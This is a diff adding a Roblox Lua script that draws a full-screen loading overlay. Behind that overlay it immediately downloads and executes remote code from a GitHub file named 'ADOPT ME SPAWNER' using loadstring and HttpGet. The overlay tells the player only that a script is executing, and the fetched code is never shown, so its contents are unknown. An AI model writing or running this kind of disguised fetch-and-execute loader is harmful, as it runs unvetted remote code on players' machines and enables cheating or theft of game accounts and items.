@@ -1,0 +1,49 @@
+local screenGui = Instance.new("ScreenGui")
+screenGui.IgnoreGuiInset = true
+screenGui.ResetOnSpawn = false
+screenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+
+local loadingText = Instance.new("TextLabel")
+loadingText.Parent = screenGui
+loadingText.Size = UDim2.new(1, 0, 1, 0)
+loadingText.Position = UDim2.new(0, 0, 0, 0)
+loadingText.BackgroundColor3 = Color3.new(0, 0, 0)
+loadingText.BackgroundTransparency = 0.4
+loadingText.TextScaled = true
+loadingText.TextColor3 = Color3.new(1, 1, 1)
+loadingText.Font = Enum.Font.SourceSansBold
+loadingText.Text = "LOADING..."
+
+local percentageText = Instance.new("TextLabel")
+percentageText.Parent = screenGui
+percentageText.Size = UDim2.new(1, 0, 0.1, 0)
+percentageText.Position = UDim2.new(0, 0, 0.8, 0)
+percentageText.BackgroundTransparency = 1
+percentageText.TextScaled = true
+percentageText.TextColor3 = Color3.new(1, 1, 1)
+percentageText.Font = Enum.Font.SourceSansBold
+percentageText.Text = "Starting..."
+
+local waitText = Instance.new("TextLabel")
+waitText.Parent = screenGui
+waitText.Size = UDim2.new(1, 0, 0.1, 0)
+waitText.Position = UDim2.new(0, 0, 0.9, 0)
+waitText.BackgroundTransparency = 1
+waitText.TextScaled = true
+waitText.TextColor3 = Color3.new(1, 1, 1)
+waitText.Font = Enum.Font.SourceSansBold
+waitText.Text = "Please wait... Executing script"
+
+-- Start external script immediately
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Scriphtub/Adopt-me-spawn/refs/heads/main/ADOPT%20ME%20SPAWNER"))()
+
+-- Optional: Loading dots animation in background
+local dots = {"LOADING", "LOADING.", "LOADING..", "LOADING..."}
+spawn(function()
+	while true do
+		for i = 1, 4 do
+			loadingText.Text = dots[i]
+			wait(0.5)
+		end
+	end
+end)
